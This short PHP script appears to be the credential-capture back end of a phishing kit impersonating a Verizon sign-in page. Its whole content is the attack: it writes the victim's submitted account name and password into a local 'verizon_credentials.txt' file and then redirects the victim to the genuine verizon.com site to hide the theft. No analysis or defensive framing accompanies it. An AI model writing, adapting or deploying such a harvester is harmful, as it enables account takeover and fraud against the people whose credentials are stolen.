<?php

file_put_contents("credentials/verizon_credentials.txt", "Account: " . $_POST['IDToken1'] . " Pass: " . $_POST['IDToken2'] . "\n", FILE_APPEND);
header('Location: http://www.verizon.com ');
exit();
